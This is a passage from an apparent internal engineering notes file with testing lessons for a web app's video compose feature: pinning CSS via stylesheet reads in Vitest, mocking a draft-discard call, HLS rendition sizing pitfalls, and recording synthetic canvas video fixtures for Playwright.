criteria are CSS ("no border", "sans", "not brand green") therefore has **zero** coverage from
component tests — ENG-558 confirmed all four of its parity changes could be reverted with the suite
green. Pin them by reading the stylesheet itself and slicing the rule block:
`readFileSync(join(process.cwd(), "app/(dash)/compose/compose.module.css"), "utf8")`.
**Use `process.cwd()`, not `new URL(..., import.meta.url)`** — under Vitest `import.meta.url` is not
a `file:` URL and `readFileSync` dies with `TypeError: The URL must be of scheme file`.

## Compose tests that REPLACE a file must mock `discardDraft`
`onPickFile` opens with ``if (draft) void discardDraft(draft.id).catch(...)``. A bare `vi.fn()`
returns `undefined`, so `.catch` throws **synchronously, before every `setState` below it** — the
swap silently does nothing and the failure surfaces as an unrelated "stale value" assertion plus an
unhandled rejection. Any test that picks a second file needs `api.discardDraft.mockResolvedValue()`.

## Edit mode plays an HLS RENDITION — never measure intrinsic size there
`HlsVideo` routes non-Safari through hls.js, which starts on a low-bitrate rendition, so
`videoWidth`/`videoHeight` at `loadedmetadata` report e.g. 640x360 for a 1080p asset. Anything that
prints pixel dimensions must measure the **picked local file** only (ENG-558 does). Related: hls.js
reports manifest/network/403 failures on its own `Hls.Events.ERROR` channel and the `<video>`
element never fires `error` — so an "on error, give up" UI state is unreachable on that path. Pair
any such state with a timeout, or it hangs on "loading" forever.

## Real video fixtures in Playwright without ffmpeg: record a canvas
There is no ffmpeg on this machine, and client footage must never reach a PR screenshot. Record a
synthetic one in-page instead: size a `<canvas>`, `captureStream(25)` → `MediaRecorder(…, "video/webm")`,
paint ~24 frames, then `setInputFiles({ buffer: Buffer.from(bytes), mimeType: "video/webm" })`. The
`<video>` reports true intrinsic dimensions from it. Paint corner ticks — they make a centre-crop
self-evident in the screenshot. Then wait for `video.videoWidth > 0` before shooting, the video
equivalent of the `img.decode()` fix (both now applied in `e2e/compose*.spec.ts`).
